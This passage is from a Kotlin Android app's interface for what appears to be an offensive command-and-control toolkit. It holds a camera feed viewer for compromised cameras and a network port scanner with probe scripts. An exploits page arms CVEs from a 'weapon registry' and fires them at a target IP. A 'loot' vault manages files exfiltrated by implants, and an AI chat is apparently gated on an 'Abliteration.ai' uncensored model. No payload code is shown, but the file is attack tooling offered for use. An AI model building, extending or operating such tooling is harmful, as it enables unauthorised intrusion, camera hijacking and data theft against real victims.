                loading -> Column(horizontalAlignment = Alignment.CenterHorizontally) {
                    CircularProgressIndicator(Modifier.size(28.dp), color = Cyan)
                    Spacer(Modifier.height(6.dp))
                    Text("FETCHING FRAME…", style = QuantumTypography.labelSmall, color = Muted)
                }
                failed -> Column(horizontalAlignment = Alignment.CenterHorizontally) {
                    Icon(
                        Icons.Outlined.Videocam,
                        contentDescription = null,
                        tint = Muted,
                        modifier = Modifier.size(40.dp),
                    )
                    Spacer(Modifier.height(4.dp))
                    Text("NO SIGNAL", style = QuantumTypography.labelSmall, color = Danger)
                    Text("tap to retry", style = QuantumTypography.labelSmall, color = Muted)
                }
            }
            if (bmp != null) {
                // centered play button — cyan when CONTROLLED, dim otherwise
                Box(
                    Modifier
                        .size(64.dp)
                        .background(Color(0x88000000), CircleShape),
                    contentAlignment = Alignment.Center,
                ) {
                    Icon(
                        Icons.Outlined.PlayArrow,
                        contentDescription = "play video feed ${cam.ip}",
                        tint = if (cam.creds != null) Cyan else SoftCyan,
                        modifier = Modifier.size(44.dp),
                    )
                }
                Text(
                    if (cam.creds != null) "● LIVE FEED" else "● FEED (NOT CONTROLLED)",
                    style = QuantumTypography.labelSmall,
                    color = if (cam.creds != null) Ok else Muted,
                    modifier = Modifier
                        .align(Alignment.BottomStart)
                        .padding(6.dp)
                        .background(Color(0xAA000000))
                        .padding(horizontal = 6.dp, vertical = 2.dp),
                )
            }
        }
    }
}

/**
 * Full-screen camera preview — auto-refreshing JPEG stills (default every
 * 3s) over the same snapshot endpoints, so it plays like live video without
 * an RTSP stack. Honest states: frame + capture time, NO SIGNAL, paused.
 */
@Composable
private fun CameraPreviewDialog(cam: CameraHit, onDismiss: () -> Unit) {
    var frame by remember(cam.ip) { mutableStateOf<CamPreview.Frame?>(null) }
    var fetching by remember { mutableStateOf(false) }
    var noSignal by remember { mutableStateOf(false) }
    var live by remember { mutableStateOf(true) }
    val scope = rememberCoroutineScope()

    suspend fun fetchFrame() {
        if (fetching) return
        fetching = true
        try {
            val f = withContext(Dispatchers.IO) {
                CamPreview.frame(cam.ip, cam.vendor, cam.creds)
            }
            if (f != null) {
                frame = f
                noSignal = false
            } else {
                noSignal = true
            }
        } finally {
            fetching = false
        }
    }

    LaunchedEffect(cam.ip) { fetchFrame() }
    LaunchedEffect(cam.ip, live) {
        while (live && isActive) {
            delay(3000)
            fetchFrame()
        }
    }

    Dialog(
        onDismissRequest = onDismiss,
        properties = DialogProperties(usePlatformDefaultWidth = false),
    ) {
        Column(
            Modifier
                .fillMaxSize()
                .background(Color(0xF2000810))
                .padding(12.dp),
        ) {
            Row(verticalAlignment = Alignment.CenterVertically) {
                Text(
                    "PREVIEW · ${cam.ip}",
                    style = QuantumTypography.titleSmall,
                    color = Cyan,
                    modifier = Modifier.weight(1f),
                )
                Text("LIVE", style = QuantumTypography.labelSmall, color = if (live) Ok else Muted)
                Spacer(Modifier.width(6.dp))
                Switch(checked = live, onCheckedChange = { live = it })
                IconButton(onClick = { scope.launch { fetchFrame() } }) {
                    Icon(Icons.Outlined.Refresh, contentDescription = "refresh frame")
                }
                IconButton(onClick = onDismiss) {
                    Icon(Icons.Outlined.Close, contentDescription = "close preview")
                }
            }
            Box(
                Modifier
                    .weight(1f)
                    .fillMaxWidth()
                    .background(Color.Black),
                contentAlignment = Alignment.Center,
            ) {
                val f = frame
                when {
                    f != null -> Image(
                        f.bitmap.asImageBitmap(),
                        contentDescription = "live preview ${cam.ip}",
                        modifier = Modifier.fillMaxSize(),
                        contentScale = ContentScale.Fit,
                    )
                    fetching -> CircularProgressIndicator(Modifier.size(32.dp), color = Cyan)
                    noSignal -> Column(horizontalAlignment = Alignment.CenterHorizontally) {
                        Icon(
                            Icons.Outlined.Videocam,
                            contentDescription = null,
                            tint = Muted,
                            modifier = Modifier.size(48.dp),
                        )
                        Spacer(Modifier.height(8.dp))
                        Text("NO SIGNAL", color = Danger)
                        Text(
                            "${cam.ip} answers none of the snapshot endpoints",
                            style = QuantumTypography.labelSmall,
                            color = Muted,
                        )
                    }
                    else -> {}
                }
                if (f != null) {
                    Text(
                        f.ts,
                        style = QuantumTypography.labelSmall,
                        color = Ok,
                        modifier = Modifier
                            .align(Alignment.TopEnd)
                            .padding(6.dp)
                            .background(Color(0xAA000000))
                            .padding(horizontal = 6.dp, vertical = 2.dp),
                    )
                }
            }
            Spacer(Modifier.height(6.dp))
            Text(
                if (live) "live stills · auto-refresh 3s" else "paused · frame from ${frame?.ts ?: "—"}",
                style = QuantumTypography.labelSmall,
                color = Muted,
            )
        }
    }
}

// ---------------------------------------------------------------------------
// Network — interfaces, MAC, VPN/proxy, DNS, geolocation
// ---------------------------------------------------------------------------

@Composable
fun NetworkPage() {
    val scope = rememberCoroutineScope()
    var snap by remember { mutableStateOf<NetDiag.Snapshot?>(null) }
    var loading by remember { mutableStateOf(false) }
    var dnsHost by rememberSaveable { mutableStateOf("") }
    var dnsResults by remember { mutableStateOf<List<Pair<String, NetDiag.GeoInfo?>>>(emptyList()) }
    var dnsBusy by remember { mutableStateOf(false) }

    // zenmap-style scan state
    var scanTarget by rememberSaveable { mutableStateOf(Net.localScope()) }
    var scanPorts by rememberSaveable {
        mutableStateOf("22,80,443,554,1900,3306,3389,5555,8000,8080,8899")
    }
    var scanTiming by rememberSaveable { mutableStateOf(3) }
    var timingMenu by remember { mutableStateOf(false) }
    var scanBusy by remember { mutableStateOf(false) }
    var scanResults by remember { mutableStateOf<List<ZenScan.HostResult>>(emptyList()) }
    var selectedScripts by remember { mutableStateOf(NseScripts.SCRIPTS.map { it.id }.toSet()) }
    var scriptFindings by remember { mutableStateOf<Map<String, List<NseScripts.Finding>>>(emptyMap()) }
    var scriptsBusy by remember { mutableStateOf(false) }

    fun load() {
        loading = true
        scope.launch {
            snap = withContext(Dispatchers.IO) { NetDiag.snapshot() }
            loading = false
        }
    }

    LaunchedEffect(Unit) { load() }

    Column(
        Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState())
            .padding(horizontal = 20.dp),
    ) {
        Text("Network", style = QuantumTypography.displaySmall, color = Cyan)
        Spacer(Modifier.height(12.dp))

        // ---- Zenmap-style manual scan controls ------------------------------
        Column(Modifier.fillMaxWidth().quantumPanel().padding(12.dp)) {
            Text("Host scan (zenmap controls)", style = QuantumTypography.titleSmall, color = SoftCyan)
            Spacer(Modifier.height(8.dp))
            OutlinedTextField(
                value = scanTarget,
                onValueChange = { scanTarget = it },
                label = { Text("target CIDR or host") },
                singleLine = true,
                modifier = Modifier.fillMaxWidth(),
            )
            Spacer(Modifier.height(6.dp))
            OutlinedTextField(
                value = scanPorts,
                onValueChange = { scanPorts = it },
                label = { Text("ports (22,80,443,1000-2000)") },
                singleLine = true,
                modifier = Modifier.fillMaxWidth(),
            )
            Spacer(Modifier.height(6.dp))
            Row(verticalAlignment = Alignment.CenterVertically) {
                OutlinedButton(onClick = { timingMenu = true }) {
                    Text(ZenScan.timingLabel(scanTiming))
                }
                DropdownMenu(
                    expanded = timingMenu,
                    onDismissRequest = { timingMenu = false },
                ) {
                    (0..5).forEach { t ->
                        DropdownMenuItem(
                            text = { Text(ZenScan.timingLabel(t)) },
                            onClick = {
                                scanTiming = t
                                timingMenu = false
                            },
                        )
                    }
                }
                Spacer(Modifier.width(8.dp))
                Text(
                    "${Net.cidrHosts(scanTarget).size} host(s) · " +
                        "${ZenScan.parsePorts(scanPorts).size} port(s)",
                    style = QuantumTypography.labelSmall,
                    color = Muted,
                    modifier = Modifier.weight(1f),
                )
            }
            Spacer(Modifier.height(8.dp))
            Button(
                onClick = {
                    scanBusy = true
                    scope.launch {
                        val results = withContext(Dispatchers.IO) {
                            ZenScan.scan(
                                Net.cidrHosts(scanTarget),
                                ZenScan.parsePorts(scanPorts),
                                scanTiming,
                            )
                        }
                        scanResults = results
                        scanBusy = false
                        C2State.audit(
                            "NET",
                            "zenmap scan $scanTarget (${ZenScan.timingLabel(scanTiming)}): " +
                                "${results.size} host(s) up"
                        )
                    }
                },
                enabled = !scanBusy && scanTarget.isNotBlank(),
                modifier = Modifier.fillMaxWidth(),
            ) { Text(if (scanBusy) "SCANNING…" else "SCAN") }
            scanResults.forEach { r ->
                Text(
                    "${r.ip}  " + r.openPorts.joinToString(","),
                    style = QuantumTypography.bodySmall,
                    color = if (r.openPorts.contains(554) || r.openPorts.contains(8899)) Ok else SoftCyan,
                    modifier = Modifier.padding(top = 4.dp),
                )
            }
            if (scanResults.isNotEmpty()) {
                Spacer(Modifier.height(8.dp))
                Text(
                    "NSE-style scripts — observation only (a finding reports what the probe " +
                        "saw; no finding means no evidence, never secure)",
                    style = QuantumTypography.labelMedium,
                    color = SoftCyan,
                )
                NseScripts.SCRIPTS.forEach { script ->
                    val on = script.id in selectedScripts
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        TextButton(onClick = {
                            selectedScripts = if (on) selectedScripts - script.id else selectedScripts + script.id
                        }) {
                            Text(if (on) "[x]" else "[ ]", color = Cyan)
                        }
                        Column(Modifier.weight(1f)) {
                            Text(script.title, style = QuantumTypography.labelLarge, color = Softest)
                            Text(
                                script.desc + " · ports " +
                                    (if (script.ports.isEmpty()) "all open" else script.ports.joinToString(",")),
                                style = QuantumTypography.labelSmall,
                                color = Muted,
                            )
                        }
                    }
                }
                Spacer(Modifier.height(6.dp))
                Button(
                    onClick = {
                        scriptsBusy = true
                        scope.launch {
                            val all = withContext(Dispatchers.IO) {
                                scanResults.associate { r ->
                                    r.ip to NseScripts.runScripts(r.ip, r.openPorts, selectedScripts)
                                }
                            }
                            scriptFindings = all
                            scriptsBusy = false
                            val n = all.values.sumOf { it.size }
                            C2State.audit(
                                "NET",
                                "nse scripts on ${all.size} host(s): $n finding(s)"
                            )
                        }
                    },
                    enabled = !scriptsBusy && selectedScripts.isNotEmpty(),
                    modifier = Modifier.fillMaxWidth(),
                ) { Text(if (scriptsBusy) "PROBING…" else "RUN SCRIPTS") }
                scriptFindings.forEach { (ip, findings) ->
                    if (findings.isNotEmpty()) {
                        Text(
                            ip,
                            style = QuantumTypography.labelMedium,
                            color = SoftCyan,
                            modifier = Modifier.padding(top = 6.dp),
                        )
                        findings.forEach { f ->
                            Text(
                                "[${f.title} :${f.port}] ${f.detail}",
                                style = QuantumTypography.bodySmall,
                                color = when (f.level) {
                                    NseScripts.Level.WARN -> Danger
                                    NseScripts.Level.NOTE -> Warn
                                    NseScripts.Level.INFO -> Muted
                                },
                                modifier = Modifier.padding(top = 2.dp),
                            )
                        }
                    }
                }
            }
        }
        Spacer(Modifier.height(8.dp))

        Button(onClick = { load() }, enabled = !loading, modifier = Modifier.fillMaxWidth()) {
            Icon(Icons.Outlined.Refresh, contentDescription = null)
            Spacer(Modifier.width(6.dp))
            Text(if (loading) "SCANNING…" else "REFRESH")
        }
        Spacer(Modifier.height(8.dp))

        val s = snap
        if (s != null) {
            StatusCard("VPN / proxy", buildString {
                append(if (s.vpnActive) "VPN ACTIVE" else "no VPN tunnel detected")
                append(" · proxy: ")
                append(s.proxy ?: "none")
            })
            StatusCard("Gateway", s.gateway ?: "unknown")
            StatusCard(
                "Public egress",
                buildString {
                    append(s.publicIp ?: "unresolvable")
                    s.geo?.line()?.let { append(" — $it") }
                },
            )
        }

        Spacer(Modifier.height(8.dp))

        // ---- DNS lookup + per-address location -----------------------------
        Column(Modifier.fillMaxWidth().quantumPanel().padding(12.dp)) {
            Text("DNS lookup", style = QuantumTypography.titleSmall, color = SoftCyan)
            Spacer(Modifier.height(8.dp))
            OutlinedTextField(
                value = dnsHost,
                onValueChange = { dnsHost = it },
                label = { Text("hostname or IP") },
                singleLine = true,
                modifier = Modifier.fillMaxWidth(),
            )
            Spacer(Modifier.height(8.dp))
            Button(
                onClick = {
                    dnsBusy = true
                    scope.launch {
                        val host = dnsHost
                        dnsResults = withContext(Dispatchers.IO) {
                            NetDiag.dnsLookup(host).map { addr ->
                                addr to if (NetDiag.isPublicIp(addr)) NetDiag.geolocate(addr) else null
                            }
                        }
                        dnsBusy = false
                    }
                },
                enabled = !dnsBusy && dnsHost.isNotBlank(),
            ) { Text(if (dnsBusy) "RESOLVING…" else "RESOLVE") }
            dnsResults.forEach { (addr, geo) ->
                Text(
                    addr + (geo?.let { " — ${it.line()}" } ?: " — private/LAN (no external lookup)"),
                    style = QuantumTypography.bodySmall,
                    color = SoftCyan,
                    modifier = Modifier.padding(top = 4.dp),
                )
            }
        }
        Spacer(Modifier.height(8.dp))

        // ---- interfaces -----------------------------------------------------
        Text("Interfaces", style = QuantumTypography.titleSmall, color = SoftCyan)
        Spacer(Modifier.height(8.dp))
        (s?.ifaces ?: emptyList()).forEach { f ->
            Column(Modifier.fillMaxWidth().quantumPanel().padding(12.dp)) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Text(
                        f.name,
                        style = QuantumTypography.titleSmall,
                        color = Cyan,
                        modifier = Modifier.weight(1f),
                    )
                    val tags = buildList {
                        if (!f.up) add("down")
                        if (f.loopback) add("loopback")
                        if (f.vpn) add("VPN")
                        if (f.up && !f.loopback && !f.vpn) add("active")
                    }
                    Text(tags.joinToString(" · "), style = QuantumTypography.labelSmall, color = Muted)
                }
                Text("IPv4: ${f.ipv4 ?: "—"}", style = QuantumTypography.bodySmall, color = SoftCyan)
                Text("IPv6: ${f.ipv6 ?: "—"}", style = QuantumTypography.bodySmall, color = SoftCyan)
                Text("MAC:  ${f.mac ?: "n/a"}", style = QuantumTypography.bodySmall, color = SoftCyan)
            }
            Spacer(Modifier.height(8.dp))
        }
        Spacer(Modifier.height(16.dp))
    }
}

// ---------------------------------------------------------------------------
// Exploits — fingerprint, zero-check, fire + MITRE coverage
// ---------------------------------------------------------------------------

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun ExploitsPage() {
    val audit by C2State.audit.collectAsState()
    val scope = rememberCoroutineScope()
    var target by rememberSaveable { mutableStateOf("") }
    var cve by rememberSaveable { mutableStateOf("CVE-2017-0144") }
    var lastResult by remember { mutableStateOf("results of the last operation appear here") }
    var busy by remember { mutableStateOf(false) }
    var weaponQuery by rememberSaveable { mutableStateOf("") }
    var weaponMenuOpen by rememberSaveable { mutableStateOf(false) }

    fun run(label: String, block: () -> JSONObject) {
        busy = true
        scope.launch {
            val out = withContext(Dispatchers.IO) {
                try {
                    block().toString(2)
                } catch (e: Exception) {
                    """{"error": "${e.message}"}"""
                }
            }
            lastResult = out
            C2State.audit(label, out.take(300))
            busy = false
        }
    }

    val covered = remember(audit) {
        MitreMapper.coverage(audit)
    }
    // ranked technique counts from the real map_audit shape {counts: {Txxxx: n}}
    val mitreRanked = remember(audit) {
        try {
            val counts = MitreMapper.mapAudit(audit).optJSONObject("counts") ?: JSONObject()
            counts.keys().asSequence()
                .filter { it.isNotBlank() }
                .map { it to counts.optInt(it) }
                .sortedByDescending { it.second }
                .take(10)
                .toList()
        } catch (e: Exception) {
            emptyList<Pair<String, Int>>()
        }
    }

    Column(
        Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState())
            .padding(horizontal = 20.dp),
    ) {
        Text("Exploits", style = QuantumTypography.displaySmall, color = Cyan)
        Spacer(Modifier.height(12.dp))

        OutlinedTextField(
            value = target,
            onValueChange = { target = it },
            label = { Text("Target IP") },
            singleLine = true,
            modifier = Modifier.fillMaxWidth(),
        )
        Spacer(Modifier.height(8.dp))
        OutlinedTextField(
            value = cve,
            onValueChange = { cve = it },
            label = { Text("CVE / weapon id (ZERO_DAY_REGISTRY)") },
            singleLine = true,
            modifier = Modifier.fillMaxWidth(),
        )
        Spacer(Modifier.height(8.dp))

        // ---- searchable weapon dropdown (selecting arms the CVE field) ------
        ExposedDropdownMenuBox(
            expanded = weaponMenuOpen,
            onExpandedChange = { weaponMenuOpen = it },
        ) {
            OutlinedTextField(
                value = weaponQuery,
                onValueChange = {
                    weaponQuery = it
                    weaponMenuOpen = true
                },
                label = { Text("Search weapon registry (dropdown)") },
                singleLine = true,
                modifier = Modifier
                    .fillMaxWidth()
                    .menuAnchor(),
            )
            ExposedDropdownMenu(
                expanded = weaponMenuOpen,
                onDismissRequest = { weaponMenuOpen = false },
            ) {
                val q = weaponQuery.trim().lowercase()
                val matches = if (q.isBlank()) Weapons.REGISTRY else Weapons.REGISTRY.filter {
                    it.cve.lowercase().contains(q) || it.name.lowercase().contains(q)
                }
                matches.take(12).forEach { w ->
                    DropdownMenuItem(
                        text = {
                            Text(
                                "${w.cve} — ${w.name} (${w.tier})",
                                style = QuantumTypography.bodySmall,
                                color = Softest,
                            )
                        },
                        onClick = {
                            cve = w.cve
                            weaponQuery = w.cve
                            weaponMenuOpen = false
                        },
                    )
                }
            }
        }
        Spacer(Modifier.height(8.dp))
        Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedButton(
                onClick = { run("RECON") { c2Api.handle("fingerprint", JSONObject().put("ip", target)) } },
                enabled = !busy && target.isNotBlank(),
            ) { Text("FINGERPRINT") }
            OutlinedButton(
                onClick = { run("RECON") { c2Api.handle("zerocheck", JSONObject().put("ip", target)) } },
                enabled = !busy && target.isNotBlank(),
            ) { Text("ZERO-CHECK") }
        }
        Spacer(Modifier.height(8.dp))
        Button(
            onClick = {
                run("ATK") {
                    c2Api.handle(
                        "fire",
                        JSONObject().put("cve", cve).put("ip", target),
                    )
                }
            },
            enabled = !busy && target.isNotBlank() && cve.isNotBlank(),
            modifier = Modifier.fillMaxWidth(),
        ) { Text(if (busy) "WORKING…" else "FIRE $cve") }

        Spacer(Modifier.height(12.dp))

        // ---- weapon registry picker (tap a CVE to arm it) ---------------------
        Text(
            "WEAPON REGISTRY — ${Weapons.REGISTRY.size} CVEs (tap to arm)",
            style = QuantumTypography.titleSmall,
            color = SoftCyan,
        )
        Spacer(Modifier.height(6.dp))
        Column(
            Modifier
                .fillMaxWidth()
                .quantumPanel()
                .padding(8.dp)
                .height(240.dp)
                .verticalScroll(rememberScrollState()),
        ) {
            Weapons.REGISTRY.forEach { w ->
                Row(
                    Modifier
                        .fillMaxWidth()
                        .clickable { cve = w.cve }
                        .padding(horizontal = 4.dp, vertical = 5.dp),
                    verticalAlignment = Alignment.CenterVertically,
                ) {
                    Text(
                        w.tier,
                        style = QuantumTypography.labelSmall,
                        fontSize = 10.sp,
                        color = when (w.tier) {
                            "V3_HIGH" -> Danger
                            "V3_MED" -> Ok
                            "legacy" -> SoftCyan
                            "ZERO-CLICK" -> Danger
                            "PERIMETER" -> Ok
                            "MALWARE" -> Danger
                            else -> Muted // V3_CHECK
                        },
                        modifier = Modifier.width(70.dp),
                    )
                    Text(
                        "${w.cve} — ${w.name}",
                        style = QuantumTypography.bodySmall,
                        color = if (cve == w.cve) Cyan else Softest,
                    )
                }
            }
        }

        Spacer(Modifier.height(12.dp))

        // ---- Exploit-DB catalog search (47k+ exploits, seed + hourly sync)
        var edbQuery by rememberSaveable { mutableStateOf("") }
        Text(
            "EXPLOIT-DB CATALOG — search 47k+ exploits",
            style = QuantumTypography.titleSmall,
            color = SoftCyan,
        )
        Spacer(Modifier.height(6.dp))
        Row(
            Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.spacedBy(8.dp),
            verticalAlignment = Alignment.CenterVertically,
        ) {
            OutlinedTextField(
                value = edbQuery,
                onValueChange = { edbQuery = it },
                label = { Text("keyword or CVE-YYYY-NNNN") },
                singleLine = true,
                modifier = Modifier.weight(1f),
            )
            OutlinedButton(
                onClick = {
                    run("EDB") {
                        ExploitDb.search(
                            com.projectzerodays.quantumcli.QuantumApp.ctx,
                            edbQuery.trim(),
                        )
                    }
                },
                enabled = !busy && edbQuery.isNotBlank(),
            ) { Text("SEARCH") }
        }
        Text(
            "Bundled seed refreshed hourly when online (catalog/ in app storage).",
            style = QuantumTypography.bodySmall,
            color = Muted,
            fontSize = 10.sp,
        )

        Spacer(Modifier.height(12.dp))
        Text("Last result", style = QuantumTypography.titleSmall, color = SoftCyan)
        Column(
            Modifier
                .fillMaxWidth()
                .quantumPanel()
                .padding(10.dp)
                .height(200.dp)
                .verticalScroll(rememberScrollState()),
        ) {
            Text(lastResult, style = QuantumTypography.bodySmall, color = Softest, fontSize = 11.sp)
        }

        Spacer(Modifier.height(12.dp))
        Text("${covered.size} MITRE techniques covered in the ledger.", color = Muted)
        mitreRanked.forEach { (tid, n) ->
            StatusCard(tid, "$n event${if (n == 1) "" else "s"}")
        }
        Spacer(Modifier.height(16.dp))
    }
}

// ---------------------------------------------------------------------------
// Loot — sealed vault management
// ---------------------------------------------------------------------------

@Composable
fun LootPage() {
    val loot by C2State.loot.collectAsState()
    val hostCount = loot.map { it.host }.distinct().size
    val totalBytes = loot.sumOf { it.bytes }
    Column(
        Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState())
            .padding(horizontal = 20.dp),
    ) {
        Text("Loot", style = QuantumTypography.displaySmall, color = Cyan)
        Spacer(Modifier.height(12.dp))

        // ---- triage header ---------------------------------------------------
        Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            Column(Modifier.weight(1f)) {
                StatusCard("Items", "${loot.size} sealed")
            }
            Column(Modifier.weight(1f)) {
                StatusCard("Hosts", "$hostCount")
            }
            Column(Modifier.weight(1f)) {
                StatusCard("Vault size", formatBytes(totalBytes))
            }
        }
        Spacer(Modifier.height(8.dp))

        // ---- vault refresh + bulk seal/unseal ---------------------------------
        Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            FilledTonalButton(onClick = { ioOp("OK") {
                C2State.scanLoot()
                "${C2State.loot.value.size} sealed item(s) indexed"
            } }, modifier = Modifier.weight(1f)) { Text("REFRESH VAULT") }
        }
        Spacer(Modifier.height(8.dp))
        Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            FilledTonalButton(
                onClick = { ioOp("LOOT") { lootBulkSeal() } },
                modifier = Modifier.weight(1f),
            ) { Text("SEAL ALL") }
            OutlinedButton(
                onClick = { ioOp("LOOT") { lootBulkUnseal() } },
                modifier = Modifier.weight(1f),
            ) { Text("UNSEAL ALL") }
        }
        Spacer(Modifier.height(8.dp))
        if (loot.isEmpty()) {
            Text("Sealed loot appears when an implant exfiltrates via /r drop.", color = Muted)
        }
        loot.forEach { entry ->
            Column(Modifier.fillMaxWidth().quantumPanel().padding(12.dp)) {
                Text(entry.fileName, style = QuantumTypography.titleSmall, color = Cyan)
                Text(
                    "host=${entry.host} · ${entry.bytes} B · ${entry.kind} · ${entry.ts}",
                    style = QuantumTypography.bodySmall,
                    color = SoftCyan,
                )
                Spacer(Modifier.height(8.dp))
                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    FilledTonalButton(onClick = {
                        ioOp("LOOT") {
                            val out = Grayfish.unseal(File(entry.sealedPath))
                            C2State.scanLoot()
                            out?.let { "unsealed -> ${it.name}" } ?: "unseal failed (key mismatch?)"
                        }
                    }) { Text("UNSEAL") }
                    OutlinedButton(onClick = {
                        ioOp("LOOT") {
                            val f = File(entry.sealedPath)
                            val ok = f.delete()
                            C2State.scanLoot()
                            if (ok) "deleted ${entry.fileName}" else "delete failed ${entry.fileName}"
                        }
                    }) { Text("DELETE") }
                }
            }
            Spacer(Modifier.height(8.dp))
        }
        Spacer(Modifier.height(16.dp))
    }
}

/** Walk loot/<host>/ and seal every plaintext file that is not already .gfy. */
private fun lootBulkSeal(): String {
    var n = 0
    C2State.lootDir.listFiles()?.filter { it.isDirectory }?.forEach { dir ->
        dir.listFiles()?.forEach { f ->
            if (f.isFile && !f.name.endsWith(".gfy")) {
                try {
                    Grayfish.seal(f)
                    n++
                } catch (e: Exception) {
                    C2State.audit("ERR", "seal ${f.name} failed: ${e.message}")
                }
            }
        }
    }
    C2State.scanLoot()
    return "SEAL ALL — $n plaintext file(s) sealed"
}

/** Walk loot/<host>/ and unseal every .gfy file (in place). */
private fun lootBulkUnseal(): String {
    var n = 0
    var fail = 0
    C2State.lootDir.listFiles()?.filter { it.isDirectory }?.forEach { dir ->
        dir.listFiles()?.forEach { f ->
            if (f.isFile && f.name.endsWith(".gfy")) {
                if (Grayfish.unseal(f) != null) n++ else fail++
            }
        }
    }
    C2State.scanLoot()
    return "UNSEAL ALL — $n unsealed, $fail failed (key mismatch?)"
}

private fun formatBytes(b: Int): String = when {
    b >= 1 shl 20 -> "%.1f MB".format(b / 1048576.0)
    b >= 1 shl 10 -> "%.1f KB".format(b / 1024.0)
    else -> "$b B"
}

// ---------------------------------------------------------------------------
// Chat — gated page + overlay with real input
// ---------------------------------------------------------------------------

@Composable
fun ChatPage() {
    val actions = LocalUiActions.current
    if (!AiGate.ready()) {
        Column(
            Modifier
                .fillMaxSize()
                .padding(20.dp),
            verticalArrangement = Arrangement.Center,
            horizontalAlignment = Alignment.CenterHorizontally,
        ) {
            Icon(
                Icons.Outlined.Lock,
                contentDescription = null,
                tint = Muted,
                modifier = Modifier.size(48.dp),
            )
            Spacer(Modifier.height(12.dp))
            Text("Chat is locked", style = QuantumTypography.titleLarge, color = Cyan)
            Text(
                "Configure the Abliteration.ai API key or download the local fallback " +
                    "model to enable the AI chat. Manual mode keeps every dashboard " +
                    "control available.",
                style = QuantumTypography.bodyMedium,
                color = Muted,
                textAlign = TextAlign.Center,
                modifier = Modifier.padding(vertical = 8.dp),
            )
            Button(onClick = actions.openWizard) { Text("Open setup wizard") }
            TextButton(onClick = actions.openManual) { Text("Read the manual") }
        }
    } else {
        ChatOverlay(
            Modifier
                .fillMaxSize()
                .padding(20.dp),
            onClose = {},
            onAction = actions.onChatAction,
        )
    }
}

@Composable
fun ChatOverlay(
    modifier: Modifier,
    onClose: () -> Unit,
    onAction: (IntentParser.ChatAction) -> Unit = {},
) {
    var text by rememberSaveable { mutableStateOf("") }
    var attachPath by rememberSaveable { mutableStateOf("") }
    var showAttachDlg by rememberSaveable { mutableStateOf(false) }
    val scope = rememberCoroutineScope()
    val listState = rememberLazyListState()
    val msgs by ChatController.messages.collectAsState()
    val busy by ChatController.busy.collectAsState()
    val mode = AiGate.modeLabel()
    val clipboard = LocalClipboardManager.current
    val ctx = LocalContext.current

    // SAF pickers: any file (OpenDocument) / photos+videos (PickVisualMedia).
    // Picked content is copied into files/attachments so the path stays valid
    // after the picker Uri is released; text files are inlined on send.
    fun copyToLocal(uri: android.net.Uri): String? = try {
        val dir = File(C2State.filesRoot, "attachments")
        dir.mkdirs()
        val name = uri.lastPathSegment?.substringAfterLast('/')
            ?.replace(Regex("[^A-Za-z0-9._-]"), "_")
            ?.takeLast(60)
        val f = File(dir, "${System.currentTimeMillis()}_${name ?: "attach"}")
        ctx.contentResolver.openInputStream(uri)?.use { input ->
            f.outputStream().use { output -> input.copyTo(output) }
        }
        f.absolutePath
    } catch (e: Exception) {
        C2State.audit("AI", "attachment copy failed: ${e.message}")
        null
    }

    val filePicker = rememberLauncherForActivityResult(
        ActivityResultContracts.OpenDocument()
    ) { uri -> uri?.let { copyToLocal(it)?.let { p -> attachPath = p } } }

    val photoPicker = rememberLauncherForActivityResult(
        ActivityResultContracts.PickVisualMedia()
    ) { uri -> uri?.let { copyToLocal(it)?.let { p -> attachPath = p } } }

    // SAF "save as…" — user picks the location, name and any extension.
    var pendingSave by remember { mutableStateOf<String?>(null) }
    val saveDocPicker = rememberLauncherForActivityResult(
        ActivityResultContracts.CreateDocument("text/plain")
    ) { uri ->
        val content = pendingSave
        pendingSave = null
        if (uri != null && content != null) {
            try {
                ctx.contentResolver.openOutputStream(uri)?.use { it.write(content.toByteArray()) }
                C2State.audit("AI", "chat message saved via SAF")
            } catch (e: Exception) {
                C2State.audit("AI", "SAF save failed: ${e.message}")
            }
        }
    }

    /** Small text attachments ride inline so every AI mode can actually read them. */
    fun inlineAttachment(path: String): String {
        val f = File(path)
        if (!f.isFile || f.length() > 16 * 1024) return "[file: $path]"
        val head = f.inputStream().use { it.readBytes() }
        val printable = head.count { it == '\n'.code.toByte() || it in 32..126 } > head.size * 0.85
        return if (printable) "[file: $path]\n${String(head)}" else "[file: $path]"
    }

    LaunchedEffect(msgs.size) {
        if (msgs.isNotEmpty()) listState.animateScrollToItem(msgs.size - 1)
    }

    Column(modifier.background(Panel).padding(14.dp)) {
        Row(verticalAlignment = Alignment.CenterVertically) {
            Text("chat · $mode", style = QuantumTypography.titleSmall, color = SoftCyan)
            Spacer(Modifier.weight(1f))
            IconButton(onClick = { ChatController.clear() }) {
                Icon(Icons.Outlined.Delete, contentDescription = "Clear chat", tint = Muted)
            }
            IconButton(onClick = onClose) {
                Icon(Icons.Outlined.Close, contentDescription = "Close", tint = SoftCyan)
            }
        }
        LazyColumn(state = listState, modifier = Modifier.weight(1f)) {
            items(msgs) { msg ->
                Row(verticalAlignment = Alignment.Top) {
                    Text(
                        (if (msg.role == "user") "> " else "") + msg.content,
                        style = QuantumTypography.bodySmall,
                        color = if (msg.role == "user") Cyan else Softest,
                        modifier = Modifier.weight(1f),
                    )
                    IconButton(
                        onClick = { clipboard.setText(AnnotatedString(msg.content)) },
                        modifier = Modifier.size(26.dp),
                    ) {
                        Icon(
                            Icons.Outlined.ContentCopy,
                            contentDescription = "Copy message",
                            tint = Muted,
                            modifier = Modifier.size(14.dp),
                        )
                    }
                    IconButton(
                        onClick = {
                            pendingSave = msg.content
                            val safe = msg.ts.replace(":", "")
                            saveDocPicker.launch("chat_${msg.role}_$safe.txt")
                        },
                        modifier = Modifier.size(26.dp),
                    ) {
                        Icon(
                            Icons.Outlined.Download,
                            contentDescription = "Download message",
                            tint = Muted,
                            modifier = Modifier.size(14.dp),
                        )
                    }
                }
                Spacer(Modifier.height(4.dp))
            }
            if (busy) {
                item {
                    Text("…", style = QuantumTypography.bodySmall, color = Muted)
                }
            }
        }
        Row(verticalAlignment = Alignment.CenterVertically) {
